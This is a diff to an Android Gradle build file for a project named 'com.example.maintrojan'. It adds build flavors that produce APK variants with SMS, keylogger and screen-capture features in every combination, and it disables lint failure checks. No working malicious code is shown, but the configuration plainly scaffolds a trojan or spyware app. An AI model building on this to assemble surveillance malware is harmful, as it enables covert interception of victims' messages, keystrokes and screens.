@@ -15,6 +15,10 @@ android {
 
         testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
     }
+    
+    buildFeatures {
+        buildConfig = true
+    }
 
     buildTypes {
         release {
@@ -22,11 +26,78 @@ android {
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
         }
     }
+    
+    lintOptions {
+        abortOnError false
+        checkReleaseBuilds false
+    }
+    
     compileOptions {
         sourceCompatibility JavaVersion.VERSION_17
         targetCompatibility JavaVersion.VERSION_17
     }
     namespace 'com.example.maintrojan'
+    
+    // Product Flavors for Feature-Selective APKs
+    flavorDimensions "features"
+    
+    productFlavors {
+        sms {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "true"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "false"
+            buildConfigField "boolean", "FEATURE_SCREEN", "false"
+            versionNameSuffix "-sms"
+        }
+        
+        keylogger {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "false"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "true"
+            buildConfigField "boolean", "FEATURE_SCREEN", "false"
+            versionNameSuffix "-keylogger"
+        }
+        
+        screen {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "false"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "false"
+            buildConfigField "boolean", "FEATURE_SCREEN", "true"
+            versionNameSuffix "-screen"
+        }
+        
+        smsKeylogger {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "true"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "true"
+            buildConfigField "boolean", "FEATURE_SCREEN", "false"
+            versionNameSuffix "-sms-keylogger"
+        }
+        
+        smsScreen {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "true"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "false"
+            buildConfigField "boolean", "FEATURE_SCREEN", "true"
+            versionNameSuffix "-sms-screen"
+        }
+        
+        keyloggerScreen {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "false"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "true"
+            buildConfigField "boolean", "FEATURE_SCREEN", "true"
+            versionNameSuffix "-keylogger-screen"
+        }
+        
+        full {
+            dimension "features"
+            buildConfigField "boolean", "FEATURE_SMS", "true"
+            buildConfigField "boolean", "FEATURE_KEYLOGGER", "true"
+            buildConfigField "boolean", "FEATURE_SCREEN", "true"
+            versionNameSuffix "-full"
+        }
+    }
 }
 
 dependencies {
